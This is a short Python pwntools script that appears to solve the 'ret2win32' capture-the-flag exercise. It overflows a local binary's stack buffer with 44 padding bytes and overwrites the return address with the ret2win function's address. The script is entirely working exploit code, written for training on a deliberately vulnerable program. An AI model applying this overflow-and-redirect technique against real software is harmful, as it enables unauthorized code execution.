from pwn import *

pipe = process("./ret2win32")

ret2win = 0x0804862C

payload = "A" * 44
payload += p32(ret2win)

print(pipe.recvuntil("> "))
pipe.sendline(payload)
print(pipe.recvall())